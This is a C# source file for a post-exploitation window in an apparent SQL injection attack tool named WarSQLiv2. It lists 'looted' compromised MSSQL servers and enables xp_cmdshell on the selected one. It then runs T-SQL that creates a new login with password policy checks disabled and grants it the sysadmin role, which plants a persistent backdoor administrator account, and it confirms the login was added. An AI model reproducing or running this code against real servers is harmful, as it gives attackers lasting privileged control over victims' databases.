using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmAddMsSqlUser.xaml
    /// </summary>
    public partial class FrmAddMsSqlUser : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmAddMsSqlUser()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnSave.Content = _languageControl.SelectedLanguage.GetString("ButtonSave");
                    Title = _languageControl.SelectedLanguage.GetString("TitleMSSQLUser");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
        private void btnSave_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }

            if (isExecuted == true && isActivated == true)
            {
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        var addUserCode = "";
                        addUserCode += "USE [master]\r\n";
                        addUserCode += "CREATE LOGIN " + txtUserName.Text + "\r\n";
                        addUserCode += "WITH PASSWORD    = N'" + txtPassword.Text + "',\r\n";
                        addUserCode += "CHECK_POLICY     = OFF,\r\n";
                        addUserCode += "CHECK_EXPIRATION = OFF;\r\n";
                        addUserCode += "EXEC sp_addsrvrolemember \r\n";
                        addUserCode += "@loginame = N'" + txtUserName.Text + "',\r\n";
                        addUserCode += "@rolename = N'sysadmin';\r\n";
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.ExploitCode = addUserCode;
                        _postExploitation.RunExploit();
                        if(!string.IsNullOrEmpty(_postExploitation.ExploitResult))
                        {
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        }
                        else
                        {
                            txtStatus.AppendText(_postExploitation.Exception);
                        }
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }

                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        var exploitCode = "select name from master.sys.sql_logins";
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.ExploitCode = exploitCode;
                        _postExploitation.RunExploit();
                        var isAdd = _postExploitation.ExploitResult.Contains(txtUserName.Text);
                        if (isAdd == true)
                        {
                            txtStatus.AppendText(Environment.NewLine + txtUserName.Text + _languageControl.SelectedLanguage.GetString("MessageExploitMysqlAddUser1"));
                        }
                        else
                        {
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageExploitMssqlAddUser1"));
                        }
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
            
        }
    }
}
